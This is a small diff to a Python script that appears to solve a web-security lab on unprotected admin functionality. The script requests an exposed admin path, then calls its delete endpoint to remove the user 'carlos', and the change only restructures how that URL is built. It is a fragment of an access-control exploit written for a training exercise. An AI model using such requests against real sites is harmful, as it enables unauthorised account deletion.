@@ -22,8 +22,8 @@ def unprotected_admin(url):
     r1 = requests.get(url+path, verify=False, proxies=proxies)
     if 'Users' not in r1.text:
         exit(-1)
-    uri = '/delete?username=carlos'
-    r2 = requests.get(url+path+uri, verify=False, proxies=proxies)
+    carlos_uri = path+'/delete?username=carlos'
+    r2 = requests.get(url+carlos_uri, verify=False, proxies=proxies)
     if 'User deleted successfully!' in r2.text:
         print('(+) User carlos deleted')
 
